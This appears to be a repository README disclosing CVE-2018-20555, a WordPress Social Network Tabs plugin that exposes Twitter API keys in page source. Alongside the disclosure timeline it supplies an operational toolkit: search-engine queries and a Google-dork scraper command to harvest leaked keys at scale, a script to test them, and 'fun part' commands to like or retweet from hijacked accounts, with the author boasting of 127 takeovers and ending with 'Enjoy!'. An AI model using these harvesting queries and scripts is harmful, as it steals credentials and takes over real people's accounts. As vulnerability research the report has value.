# CVE-2018-20555
The Wordpress Plugin called [Social Network Tabs](http://www.designchemical.com/blog/index.php/premium-wordpress-plugins/premium-wordpress-plugin-social-network-tabs/), made by the company Design Chemical, is leaking twice the Twitter access_token, access_token_secret, consumer_key and consumer_secret of their user which is leading to a takeover of their Twitter account.

This is caused by the following lines of code within the page where the Twitter widget is displayed:
```javascript
jQuery(document).ready(function ($) {
	var config = {
		widgets: "twitter,facebook,youtube",
		twitterId: "[redacted]",
		facebookId: "[redacted]",
		youtubeId: "[redacted]",
		twitter: {
			url: "https://www.rainx.com/wp-content/plugins/social-network-tabs/inc/dcwp_twitter.php?1=%5Breadcted%5D&2=%5Bredacted%5D&3=%5Bredacted%5D&4=%5Bredacted%5D …",
			title: "Latest Tweets",
			follow: "Follow",
			followId: "",
			limit: "10",
			retweets: true,
			replies: true,
			images: "thumb",
			consumer_key: "[redacted]",
			consumer_secret: "[redacted]",
			access_token: "[redacted]",
			access_token_secret: "[redacted]"
		},
	}
});
```

## Exploitation
Thanks to [Publicwww](https://publicwww.com), with the following search queries, I managed to retrieve the Twitter access_token, access_token_secret, consumer_key and consumer_secret from 539 vulnerable websites:

- dcwp_twitter.php access_token_secret snipexp:|access_token: "([\w\d-._]+)"|
- dcwp_twitter.php access_token_secret snipexp:|access_token_secret: "([\w\d-._]+)"|
- dcwp_twitter.php access_token_secret snipexp:|consumer_key: "([\w\d-._]+)"|
- dcwp_twitter.php access_token_secret snipexp:|consumer_secret: "([\w\d-._]+)"|

All the keys are available in twitter_keys.csv.

## How to
Test the Twitter API keys in twitter_keys.csv
```console
python test_twitter_api_keys.py -t
```
The 1st time I had run this command, I got the information of 446 Twitter accounts. It's worth mentioning that there were 2 verified accounts in the list and multiple accounts with more than 10K+ followers. All the vulnerable accounts are in vulnerable_accounts.txt.

## Fun part
Like the tweet of your choice
```console
python test_twitter_api_keys.py -l [tweet_id]
```

Retweet the tweet of your choice
```console
python test_twitter_api_keys.py -r [tweet_id]
```

The 1st time I run this command, I managed to liked the tweet of my choice 127 times, which shown that 127 Twitter api keys had the read write rights aka I was able to take over 127 Twitter accounts (change profile picture, like, retweet, change bio,...) due to this key leaks.

## UPDATE 17/01/18
A lot of websites and so Twitter accounts are still vulnerable to this issue. In order to identify them, I created a scraper
```console
cd TwitterApiKeysSearchEngine/

scrapy crawl TwitterApiKeysSpider -a keyword="inurl:/inc/dcwp_twitter.php?1=" -a se=google -a pages=10
```
The total of results for this Google search query is 3550. Among the 9 first pages, I managed to retrieved 78 keys (86%). Enjoy!

## Disclosure
- 01/12/18: Disclosure to Twitter
- 0X/12/18: Twitter deactivated all the keys
- 11/12/18: Acknowledgement as a valid security issue by Twitter

## Contact
Follow me on [Twitter](https://twitter.com/fs0c131y)! You can also find a small part of my work at [https://fs0c131y.com](https://fs0c131y.com)

## Credits
The investigation and the POC has been made with ❤️ by @fs0c131y
